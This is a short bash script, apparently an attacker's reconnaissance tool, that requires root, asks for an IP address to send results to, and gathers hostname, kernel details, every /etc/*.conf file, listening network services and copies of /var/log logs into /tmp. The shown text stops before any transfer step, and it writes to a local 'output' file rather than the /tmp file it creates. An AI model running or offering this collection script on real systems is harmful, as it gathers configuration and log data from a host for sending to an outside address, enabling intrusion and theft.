#!/bin/bash

# Automated tool used to perform
# system configuration scraping


# Output File Name
OF=output
LOGFILES=logconfs

# Set-up files
touch /tmp/$OF
mkdir /tmp/$LOGFILES

# Check to see if root
if [ `whoami` == root ]; then
	echo "[+] Confirmed User is Root";
else
	echo "[-] User must be root to access all files. Quitting";
	exit 0
fi

# Target to send files to
echo -n "IP Address to send results to followed by [Enter]:"
read TARGET

# Primary Scrape
hostname >> $OF
uname -a >> $OF
cat /etc/*.conf >> $OF
netstat -plant >> $OF

for i in `find /var/log/*.log | cut -f 4 -d /`; do
	cp /var/log/$i /tmp/$LOGFILES/$i;
done

